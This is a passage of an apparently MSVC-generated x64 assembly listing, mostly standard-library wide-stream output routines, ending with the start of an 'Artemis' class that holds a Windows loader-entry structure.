	mov	QWORD PTR _Count$[rsp], rax
	mov	rax, QWORD PTR _Val$[rsp]
	inc	rax
	mov	QWORD PTR _Val$[rsp], rax
$LN7@operator:
	cmp	DWORD PTR _State$[rsp], 0
	jne	$LN6@operator
	cmp	QWORD PTR _Count$[rsp], 0
	jle	$LN6@operator

; 702  :             if (_Traits::eq_int_type(_Traits::eof(), _Ostr.rdbuf()->sputc(_Ctype_fac.widen(*_Val)))) {

	mov	rax, QWORD PTR _Val$[rsp]
	movzx	edx, BYTE PTR [rax]
	mov	rcx, QWORD PTR _Ctype_fac$7[rsp]
	call	?widen@?$ctype@_W@std@@QEBA_WD@Z	; std::ctype<wchar_t>::widen
	mov	WORD PTR tv328[rsp], ax
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR tv329[rsp], rax
	movzx	edx, WORD PTR tv328[rsp]
	mov	rcx, QWORD PTR tv329[rsp]
	call	?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputc
	mov	WORD PTR tv330[rsp], ax
	movzx	eax, WORD PTR tv330[rsp]
	mov	WORD PTR $T3[rsp], ax
	call	?eof@?$_WChar_traits@_W@std@@SAGXZ	; std::_WChar_traits<wchar_t>::eof
	mov	WORD PTR $T4[rsp], ax
	lea	rdx, QWORD PTR $T3[rsp]
	lea	rcx, QWORD PTR $T4[rsp]
	call	?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z ; std::_WChar_traits<wchar_t>::eq_int_type
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN16@operator

; 703  :                 _State |= ios_base::badbit;

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax
$LN16@operator:

; 704  :             }
; 705  :         }

	jmp	$LN5@operator
$LN6@operator:

; 706  : 
; 707  :         if (_State == ios_base::goodbit) {

	cmp	DWORD PTR _State$[rsp], 0
	jne	$LN17@operator

; 708  :             for (; 0 < _Pad; --_Pad) { // pad on right

	jmp	SHORT $LN10@operator
$LN8@operator:
	mov	rax, QWORD PTR _Pad$[rsp]
	dec	rax
	mov	QWORD PTR _Pad$[rsp], rax
$LN10@operator:
	cmp	QWORD PTR _Pad$[rsp], 0
	jle	$LN17@operator

; 709  :                 if (_Traits::eq_int_type(_Traits::eof(), _Ostr.rdbuf()->sputc(_Ostr.fill()))) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?fill@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBA_WXZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::fill
	mov	WORD PTR tv331[rsp], ax
	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR tv332[rsp], rax
	movzx	edx, WORD PTR tv331[rsp]
	mov	rcx, QWORD PTR tv332[rsp]
	call	?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::sputc
	mov	WORD PTR tv333[rsp], ax
	movzx	eax, WORD PTR tv333[rsp]
	mov	WORD PTR $T5[rsp], ax
	call	?eof@?$_WChar_traits@_W@std@@SAGXZ	; std::_WChar_traits<wchar_t>::eof
	mov	WORD PTR $T6[rsp], ax
	lea	rdx, QWORD PTR $T5[rsp]
	lea	rcx, QWORD PTR $T6[rsp]
	call	?eq_int_type@?$_WChar_traits@_W@std@@SA_NAEBG0@Z ; std::_WChar_traits<wchar_t>::eq_int_type
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN18@operator

; 710  :                     _State |= ios_base::badbit; // insertion failed, quit

	mov	eax, DWORD PTR _State$[rsp]
	or	eax, 4
	mov	DWORD PTR _State$[rsp], eax

; 711  :                     break;

	jmp	SHORT $LN17@operator
$LN18@operator:

; 712  :                 }
; 713  :             }

	jmp	$LN8@operator
$LN17@operator:

; 714  :         }
; 715  : 
; 716  :         _Ostr.width(0);

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	edx, edx
	mov	rcx, rax
	call	?width@ios_base@std@@QEAA_J_J@Z		; std::ios_base::width
	npad	1
	jmp	SHORT $LN12@operator
$LN27@operator:
$LN12@operator:

; 717  :         _CATCH_IO_(ios_base, _Ostr)
; 718  :     }
; 719  : 
; 720  :     _Ostr.setstate(_State);

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, DWORD PTR _State$[rsp]
	mov	rcx, rax
	call	?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate

; 721  :     return _Ostr;

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	QWORD PTR $T8[rsp], rax
	lea	rcx, QWORD PTR _Ok$[rsp]
	call	??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::~sentry
	mov	rax, QWORD PTR $T8[rsp]

; 722  : }

	add	rsp, 200				; 000000c8H
	ret	0
??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z ENDP ; std::operator<<<wchar_t,std::char_traits<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$ = 32
tv325 = 36
tv327 = 38
$T1 = 40
$T2 = 42
tv328 = 44
tv330 = 46
$T3 = 48
$T4 = 50
tv331 = 52
tv333 = 54
$T5 = 56
$T6 = 58
_Pad$ = 64
_Count$ = 72
tv324 = 80
tv137 = 88
tv139 = 96
tv320 = 104
tv323 = 112
tv326 = 120
_Ctype_fac$7 = 128
tv329 = 136
tv332 = 144
$T8 = 152
_Ok$ = 160
$T9 = 176
_Ostr$ = 208
_Val$ = 216
?dtor$0@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA PROC ; `std::operator<<<wchar_t,std::char_traits<wchar_t> >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Ok$[rbp]
	call	??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::~sentry
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA ENDP ; `std::operator<<<wchar_t,std::char_traits<wchar_t> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$ = 32
tv325 = 36
tv327 = 38
$T1 = 40
$T2 = 42
tv328 = 44
tv330 = 46
$T3 = 48
$T4 = 50
tv331 = 52
tv333 = 54
$T5 = 56
$T6 = 58
_Pad$ = 64
_Count$ = 72
tv324 = 80
tv137 = 88
tv139 = 96
tv320 = 104
tv323 = 112
tv326 = 120
_Ctype_fac$7 = 128
tv329 = 136
tv332 = 144
$T8 = 152
_Ok$ = 160
$T9 = 176
_Ostr$ = 208
_Val$ = 216
?dtor$1@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA PROC ; `std::operator<<<wchar_t,std::char_traits<wchar_t> >'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T9[rbp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA ENDP ; `std::operator<<<wchar_t,std::char_traits<wchar_t> >'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$ = 32
tv325 = 36
tv327 = 38
$T1 = 40
$T2 = 42
tv328 = 44
tv330 = 46
$T3 = 48
$T4 = 50
tv331 = 52
tv333 = 54
$T5 = 56
$T6 = 58
_Pad$ = 64
_Count$ = 72
tv324 = 80
tv137 = 88
tv139 = 96
tv320 = 104
tv323 = 112
tv326 = 120
_Ctype_fac$7 = 128
tv329 = 136
tv332 = 144
$T8 = 152
_Ok$ = 160
$T9 = 176
_Ostr$ = 208
_Val$ = 216
?catch$2@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA PROC ; `std::operator<<<wchar_t,std::char_traits<wchar_t> >'::`1'::catch$2

; 717  :         _CATCH_IO_(ios_base, _Ostr)

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$??$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z$0:
	mov	rax, QWORD PTR _Ostr$[rbp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rbp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8b, 1
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate
	npad	1
	lea	rax, $LN27@catch$2
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$2@?0???$?6_WU?$char_traits@_W@std@@@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@PEBD@Z@4HA ENDP ; `std::operator<<<wchar_t,std::char_traits<wchar_t> >'::`1'::catch$2
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ
_TEXT	SEGMENT
_State$1 = 32
tv78 = 36
_Rdbuf$ = 40
_Ok$2 = 48
this$ = 80
?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ PROC ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::flush, COMDAT

; 555  :     basic_ostream& __CLR_OR_THIS_CALL flush() { // flush output stream

$LN13:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 556  :         const auto _Rdbuf = _Myios::rdbuf();

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR _Rdbuf$[rsp], rax

; 557  :         if (_Rdbuf) { // buffer exists, flush it

	cmp	QWORD PTR _Rdbuf$[rsp], 0
	je	SHORT $LN2@flush

; 558  :             const sentry _Ok(*this);

	mov	rdx, QWORD PTR this$[rsp]
	lea	rcx, QWORD PTR _Ok$2[rsp]
	call	??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::sentry
	npad	1

; 559  : 
; 560  :             if (_Ok) {

	lea	rcx, QWORD PTR _Ok$2[rsp]
	call	??Bsentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEBA_NXZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::operator bool
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN3@flush

; 561  :                 ios_base::iostate _State = ios_base::goodbit;

	mov	DWORD PTR _State$1[rsp], 0

; 562  :                 _TRY_IO_BEGIN
; 563  :                 if (_Rdbuf->pubsync() == -1) {

	mov	rcx, QWORD PTR _Rdbuf$[rsp]
	call	?pubsync@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAHXZ ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::pubsync
	mov	DWORD PTR tv78[rsp], eax
	cmp	DWORD PTR tv78[rsp], -1
	jne	SHORT $LN5@flush

; 564  :                     _State |= ios_base::badbit; // sync failed

	mov	eax, DWORD PTR _State$1[rsp]
	or	eax, 4
	mov	DWORD PTR _State$1[rsp], eax
$LN5@flush:
	jmp	SHORT $LN10@flush
$LN11@flush:
$LN10@flush:

; 565  :                 }
; 566  :                 _CATCH_IO_END
; 567  :                 _Myios::setstate(_State);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, DWORD PTR _State$1[rsp]
	mov	rcx, rax
	call	?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate
	npad	1
$LN3@flush:

; 568  :             }
; 569  :         }

	lea	rcx, QWORD PTR _Ok$2[rsp]
	call	??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::~sentry
$LN2@flush:

; 570  :         return *this;

	mov	rax, QWORD PTR this$[rsp]

; 571  :     }

	add	rsp, 72					; 00000048H
	ret	0
?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ ENDP ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::flush
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$1 = 32
tv78 = 36
_Rdbuf$ = 40
_Ok$2 = 48
this$ = 80
?dtor$0@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA PROC ; `std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::flush'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Ok$2[rbp]
	call	??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::sentry::~sentry
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA ENDP ; `std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::flush'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_State$1 = 32
tv78 = 36
_Rdbuf$ = 40
_Ok$2 = 48
this$ = 80
?catch$1@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA PROC ; `std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::flush'::`1'::catch$1

; 566  :                 _CATCH_IO_END

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$?flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ$0:
	mov	rax, QWORD PTR this$[rbp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rbp]
	add	rcx, rax
	mov	rax, rcx
	mov	r8b, 1
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate
	npad	1
	lea	rax, $LN11@catch$1
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$1@?0??flush@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAAEAV12@XZ@4HA ENDP ; `std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::flush'::`1'::catch$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
tv153 = 32
tv154 = 36
tv156 = 40
tv155 = 48
this$ = 80
?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ PROC ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Osfx, COMDAT

; 154  :     void __CLR_OR_THIS_CALL _Osfx() { // perform any wrapup

$LN11:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 72					; 00000048H

; 155  :         _TRY_BEGIN
; 156  :         if (this->good() && this->flags() & ios_base::unitbuf) {

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?good@ios_base@std@@QEBA_NXZ		; std::ios_base::good
	mov	BYTE PTR tv153[rsp], al
	movzx	eax, BYTE PTR tv153[rsp]
	test	eax, eax
	je	$LN3@Osfx
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	mov	DWORD PTR tv154[rsp], eax
	mov	eax, DWORD PTR tv154[rsp]
	and	eax, 2
	test	eax, eax
	je	SHORT $LN3@Osfx

; 157  :             if (_Myios::rdbuf()->pubsync() == -1) { // flush stream as needed

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
	mov	QWORD PTR tv155[rsp], rax
	mov	rcx, QWORD PTR tv155[rsp]
	call	?pubsync@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAHXZ ; std::basic_streambuf<wchar_t,std::char_traits<wchar_t> >::pubsync
	mov	DWORD PTR tv156[rsp], eax
	cmp	DWORD PTR tv156[rsp], -1
	jne	SHORT $LN3@Osfx

; 158  :                 _Myios::setstate(ios_base::badbit);

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR this$[rsp]
	add	rcx, rax
	mov	rax, rcx
	xor	r8d, r8d
	mov	edx, 4
	mov	rcx, rax
	call	?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate
	npad	1
$LN3@Osfx:
	jmp	SHORT $LN8@Osfx
$LN9@Osfx:
$LN8@Osfx:

; 159  :             }
; 160  :         }
; 161  :         _CATCH_ALL
; 162  :         _CATCH_END
; 163  :     }

	add	rsp, 72					; 00000048H
	ret	0
?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ ENDP ; std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Osfx
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
tv153 = 32
tv154 = 36
tv156 = 40
tv155 = 48
this$ = 80
?catch$0@?0??_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ@4HA PROC ; `std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Osfx'::`1'::catch$0

; 161  :         _CATCH_ALL

	mov	QWORD PTR [rsp+16], rdx
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
__catch$?_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ$0:

; 162  :         _CATCH_END

	lea	rax, $LN9@catch$0
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
	int	3
?catch$0@?0??_Osfx@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAAXXZ@4HA ENDP ; `std::basic_ostream<wchar_t,std::char_traits<wchar_t> >::_Osfx'::`1'::catch$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?fill@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBA_WXZ
_TEXT	SEGMENT
this$ = 8
?fill@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBA_WXZ PROC ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::fill, COMDAT

; 99   :     _Elem __CLR_OR_THIS_CALL fill() const {

	mov	QWORD PTR [rsp+8], rcx

; 100  :         return _Fillch;

	mov	rax, QWORD PTR this$[rsp]
	movzx	eax, WORD PTR [rax+88]

; 101  :     }

	ret	0
?fill@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBA_WXZ ENDP ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::fill
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ PROC ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf, COMDAT

; 78   :     _NODISCARD _Mysb* __CLR_OR_THIS_CALL rdbuf() const {

	mov	QWORD PTR [rsp+8], rcx

; 79   :         return _Mystrbuf;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+72]

; 80   :     }

	ret	0
?rdbuf@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_streambuf@_WU?$char_traits@_W@std@@@2@XZ ENDP ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::rdbuf
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?tie@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_ostream@_WU?$char_traits@_W@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?tie@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_ostream@_WU?$char_traits@_W@std@@@2@XZ PROC ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::tie, COMDAT

; 68   :     _Myos* __CLR_OR_THIS_CALL tie() const {

	mov	QWORD PTR [rsp+8], rcx

; 69   :         return _Tiestr;

	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax+80]

; 70   :     }

	ret	0
?tie@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEBAPEAV?$basic_ostream@_WU?$char_traits@_W@std@@@2@XZ ENDP ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::tie
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z
_TEXT	SEGMENT
this$ = 48
_State$ = 56
_Reraise$ = 64
?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z PROC ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate, COMDAT

; 51   :         iostate _State, bool _Reraise = false) { // merge _State into state, possibly reraise exception

$LN3:
	mov	BYTE PTR [rsp+24], r8b
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 52   :         clear(rdstate() | _State, _Reraise);

	mov	rcx, QWORD PTR this$[rsp]
	call	?rdstate@ios_base@std@@QEBAHXZ		; std::ios_base::rdstate
	or	eax, DWORD PTR _State$[rsp]
	movzx	r8d, BYTE PTR _Reraise$[rsp]
	mov	edx, eax
	mov	rcx, QWORD PTR this$[rsp]
	call	?clear@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::clear

; 53   :     }

	add	rsp, 40					; 00000028H
	ret	0
?setstate@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ENDP ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::setstate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ios
;	COMDAT ?clear@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z
_TEXT	SEGMENT
tv72 = 32
this$ = 64
_State$ = 72
_Reraise$ = 80
?clear@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z PROC ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::clear, COMDAT

; 39   :     void __CLR_OR_THIS_CALL clear(iostate _State = goodbit, bool _Reraise = false) {

$LN5:
	mov	BYTE PTR [rsp+24], r8b
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 40   :         // set state, possibly reraise exception
; 41   :         ios_base::clear(_State | (_Mystrbuf ? ios_base::_Iostate{} : ios_base::badbit), _Reraise);

	mov	rax, QWORD PTR this$[rsp]
	cmp	QWORD PTR [rax+72], 0
	je	SHORT $LN3@clear
	mov	DWORD PTR tv72[rsp], 0
	jmp	SHORT $LN4@clear
$LN3@clear:
	mov	DWORD PTR tv72[rsp], 4
$LN4@clear:
	mov	eax, DWORD PTR tv72[rsp]
	mov	ecx, DWORD PTR _State$[rsp]
	or	ecx, eax
	mov	eax, ecx
	movzx	r8d, BYTE PTR _Reraise$[rsp]
	mov	edx, eax
	mov	rcx, QWORD PTR this$[rsp]
	call	?clear@ios_base@std@@QEAAXH_N@Z		; std::ios_base::clear

; 42   :     }

	add	rsp, 56					; 00000038H
	ret	0
?clear@?$basic_ios@_WU?$char_traits@_W@std@@@std@@QEAAXH_N@Z ENDP ; std::basic_ios<wchar_t,std::char_traits<wchar_t> >::clear
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1Artemis@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1Artemis@@QEAA@XZ PROC				; Artemis::~Artemis, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	add	rax, 56					; 00000038H
	mov	rcx, rax
	call	??1LDR_DATA_TABLE_ENTRY@@QEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??1Artemis@@QEAA@XZ ENDP				; Artemis::~Artemis
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0Artemis@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??0Artemis@@QEAA@XZ PROC				; Artemis::Artemis, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
